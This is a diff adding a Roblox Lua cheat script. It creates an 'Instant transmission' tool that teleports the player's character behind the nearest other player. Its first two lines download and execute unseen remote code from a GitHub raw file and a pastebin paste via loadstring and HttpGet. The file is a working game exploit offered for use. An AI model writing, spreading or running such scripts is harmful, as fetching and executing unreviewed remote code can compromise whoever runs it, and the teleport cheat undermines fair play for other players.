@@ -1,0 +1,62 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/frosty-601/AIice-Hub/main/Goku2"))()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/NDjRmTKv"))()
+
+-- Create the Tool
+local tool = Instance.new("Tool")
+tool.Name = "Instant transmission"
+tool.RequiresHandle = false
+tool.CanBeDropped = false
+
+-- Add the Tool to the player's Backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+-- Function to find the closest player
+local function findClosestPlayer()
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if not character then return nil end
+
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return nil end
+
+    local closestPlayer = nil
+    local shortestDistance = math.huge
+
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local otherHumanoidRootPart = otherPlayer.Character.HumanoidRootPart
+            local distance = (humanoidRootPart.Position - otherHumanoidRootPart.Position).magnitude
+
+            if distance < shortestDistance then
+                shortestDistance = distance
+                closestPlayer = otherPlayer
+            end
+        end
+    end
+
+    return closestPlayer
+end
+
+-- Function to teleport the player to the closest player
+local function teleportToClosestPlayer()
+    local player = game.Players.LocalPlayer
+    local closestPlayer = findClosestPlayer()
+
+    if closestPlayer and closestPlayer.Character then
+        local closestHumanoidRootPart = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if closestHumanoidRootPart then
+            local character = player.Character or player.CharacterAdded:Wait()
+            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+            humanoidRootPart.CFrame = closestHumanoidRootPart.CFrame * CFrame.new(0, 0, 3)  -- Teleport 3 studs behind the closest player
+        end
+    end
+end
+
+-- Function to execute when the tool is activated
+local function onActivated()
+    teleportToClosestPlayer()
+end
+
+-- Connect the activation function to the tool
+tool.Activated:Connect(onActivated)
